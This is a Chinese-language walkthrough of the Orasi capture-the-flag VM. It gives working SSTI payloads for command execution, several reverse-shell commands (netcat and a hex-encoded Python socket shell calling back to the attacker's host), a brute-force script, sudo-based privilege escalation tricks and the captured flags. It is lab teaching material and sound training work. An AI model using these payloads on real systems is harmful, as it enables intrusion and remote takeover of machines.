# Orasi

:::note

[Linux VM] [Tested on VirtualBox] created by || alienum

⏲️ Release Date // 2021-02-14

✔️ MD5 // 4bd04ed7760026c3207e13e62b99c5a2

☠ Root // 29

💀 User // 28

📝Notes //
CTF like VM. Hint: Just one useless little dot.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.111
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.111
Host is up (0.00033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8a:07:93:8e:8a:d6:67:fe:d0:10:88:14:61:49:5a:66 (RSA)
|   256 5a:cd:25:31:ec:f2:02:a8:a8:ec:32:c9:63:89:b2:e3 (ECDSA)
|_  256 39:70:57:cc:bb:9b:65:50:36:8d:71:00:a2:ac:24:36 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.7.3
```

## ftp 匿名登陆

探测环境

```bash
ftp> ls -lah
229 Entering Extended Passive Mode (|||42117|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub
ftp> ls -lah
229 Entering Extended Passive Mode (|||45906|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..
-rw-r--r--    1 ftp      ftp         16976 Feb 07  2021 url
```

得到一个文件 `url`

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $file url
url: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef3648aae50173281b64e2d9f71511b1b4abb0a3, for GNU/Linux 3.2.0, not stripped
```

尝试反编译

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    init = (__int64)malloc(8uLL);
    *(_BYTE *)init = 111;
    *(_DWORD *)(init + 4) = -1;
    insert(1LL, 47LL);
    insert(2LL, 115LL);
    insert(42LL, 104LL);
    insert(4LL, 52LL);
    insert(12LL, 100LL);
    insert(14LL, 48LL);
    insert(17LL, 119LL);
    insert(18LL, 36LL);
    insert(19LL, 115LL);
    puts("Sometimes things are not obvious");
    item = search(18LL);
    if (item)
    printf("Element found: %d\n", (unsigned int)*(char *)item);
    else
    puts("Element not found");
    return 0;
}
```

其中 `insert` 部分的数据有点奇怪，写个脚本解码看看

```python
data = [47, 115, 104, 52, 100, 48, 119, 36, 115]

for i in data:
    print(chr(i),end="")

# /sh4d0w$s
```

## web 服务 Port-80

直接请求，查看返回的数据

```html
<head>
</head>
    <body>
    <h1>Orasi</h1>
    <br>
    <p>6 6 1337leet</p>
</body>
```

返回的数据，怀疑是 `crunch` 工具的参数，尝试先跑一份字典

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $crunch 6 6 1337leet > Orasi.dic
Crunch will now generate the following amount of data: 326592 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 46656
```

尝试目录爆破，未发现有价值信息

## web 服务 Port-5000

尝试利用得到的路径进行访问

```plaintext title="http://192.168.56.111:5000/sh4d0w$s"
No input
```

尝试看看使用上面跑出来的字典进行爆破

```bash
import requests
from rich.progress import Progress

url = "http://192.168.56.111:5000/sh4d0w$s?{}={{1+1}}"

with open("./Orasi.dic", "r") as f:
    words = f.read()
    words = words.split("\n")

with Progress() as progress:
    task = progress.add_task("[cyan]Processing...", total=len(words))

    for word in words:
        progress.update(task, advance=1)
        # print(url.format(word))
        res = requests.get(url.format(word))
        if res.text != "No input":
            print(url.format(word))
# http://192.168.56.111:5000/sh4d0w$s?l333tt={1+1}
```

### SSTI 注入攻击

经过测试，可以直接实现命令执行

```plaintext
http://192.168.56.111:5000/sh4d0w$s?l333tt={{"".__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

http://192.168.56.111:5000/sh4d0w$s?l333tt={{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)}}
```

直接反弹 shell

```bash
# http://192.168.56.111:5000/sh4d0w$s?l333tt={{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27nc%20-c%20bash%20192.168.56.102%209999%27).read()%22)}}
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs -lp 9999
[16:01:24] Welcome to pwncat 🐈!
[16:01:51] received connection from 192.168.56.111:40380
[16:01:52] 192.168.56.111:40380: registered new host w/ db
(local) pwncat$ back
(remote) www-data@orasi:/var/www/html$ whoami
www-data
```

## User - www-data

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for www-data on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on orasi:
    (kori) NOPASSWD: /bin/php /home/kori/jail.php *
```

### 尝试提权

```bash
(remote) www-data@orasi:/home/kori$ sudo -u kori /bin/php /home/kori/jail.php "n''c -c ba''sh 192.168.56.102 8888"
```

由于引号可以分割字符串再直接拼接，即可直接反弹 shell

## User - kori

```bash
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 8888
[16:14:50] Welcome to pwncat 🐈!
[16:15:27] received connection from 192.168.56.111:50162
[16:15:28] 192.168.56.111:50162: registered new host w/ db
(local) pwncat$ back
(remote) kori@orasi:/home/kori$ whoami
kori
```

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for kori on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kori may run the following commands on orasi:
    (irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
```

直接将文件复制过来

```bash
(remote) kori@orasi:/home/kori$ touch /home/kori/irida.apk
(remote) kori@orasi:/home/kori$ chmod 777 /home/kori/irida.apk
(remote) kori@orasi:/home/kori$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
```

下载文件进行分析

## Android .apk 文件逆向

定位到 `com.alienum.irida.data.LoginDataSource`

```java
package com.alienum.irida.data;

import com.alienum.irida.data.Result;
import com.alienum.irida.data.model.LoggedInUser;
import java.io.IOException;
import java.util.HashMap;
import java.util.UUID;

/* loaded from: classes.dex */
public class LoginDataSource {
    public Result<LoggedInUser> login(String username, String password) {
        if (username.equals("irida") && password.equals(protector("1#2#3#4#5"))) {
            try {
                LoggedInUser user = new LoggedInUser(UUID.randomUUID().toString(), "Irida Orasis");
                return new Result.Success(user);
            } catch (Exception e) {
                return new Result.Error(new IOException("Error logging in", e));
            }
        }
        return new Result.Error(new IOException("Error logging in", null));
    }

    public void logout() {
    }

    public String protector(String password) {
        String[] i = password.split("#");
        HashMap<String, String> lexiko = new HashMap<>();
        lexiko.put(i[0], "eye");
        lexiko.put(i[3], "tiger");
        lexiko.put(i[4], "()");
        lexiko.put(i[1], "of");
        lexiko.put(i[2], "the");
        String buildPassword = lexiko.get(i[0]) + "." + lexiko.get(i[1]) + "." + lexiko.get(i[2]) + "." + lexiko.get(i[3]) + "." + lexiko.get(i[4]);
        System.out.println(buildPassword);
        return buildPassword;
    }
}
```

核心在于 `protector` 这个函数里面，简单分析即可得到其运行结果

```plaintext
eye.of.the.tiger()
```

得到一组凭据

```plaintext
irida:eye.of.the.tiger()
```

## User - irida

```bash
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs irida@192.168.56.111
[16:30:54] Welcome to pwncat 🐈!
Password: ******************
[16:30:59] 192.168.56.111:22: normalizing shell path
           192.168.56.111:22: registered new host w/ db
(local) pwncat$ back
(remote) irida@orasi:/home/irida$ whoami
irida
```

### flag - user

```bash
(remote) irida@orasi:/home/irida$ cat user.txt
2afb9cbb10c22dc7e154a8c434595948
```

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for irida on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User irida may run the following commands on orasi:
    (root) NOPASSWD: /usr/bin/python3 /root/oras.py
```

尝试执行

```bash
(remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py
: ls
Traceback (most recent call last):
  File "/root/oras.py", line 7, in <module>
    name = bytes.fromhex(name).decode('utf-8')
ValueError: non-hexadecimal number found in fromhex() arg at position 0
```

根据报错信息，可以知道这是一个 hex 解码的过程，传入一个十六进制字符串试试

```plaintext
ls --> 6C73
```

```bash
(remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py
: 6C73
Traceback (most recent call last):
  File "/root/oras.py", line 8, in <module>
    print(exec(name))
  File "<string>", line 1, in <module>
NameError: name 'ls' is not defined
```

根据这次的报错信息，即可知道攻击方式

```plaintext
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")

-->

696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223139322E3136382E35362E313032222C3838383829293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B6F732E6475703228732E66696C656E6F28292C32293B696D706F7274207074793B207074792E737061776E2822626173682229
```

```bash
(remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py
: 696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223139322E3136382E35362E313032222C3838383829293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B6F732E6475703228732E66696C656E6F28292C32293B696D706F7274207074793B207074792E737061776E2822626173682229
```

## User - root

```bash
(local) pwncat$ connect -lp 8888
[16:38:44] received connection from 192.168.56.111:50164
[16:38:44] 192.168.56.111:50164: loaded known host from db
(local) pwncat$ back
(remote) root@orasi:/home/irida# whoami
root
```

### flag - root

```bash
(remote) root@orasi:/root# cat root.txt
b1c17c79773c831cbb9109802059c6b5
```
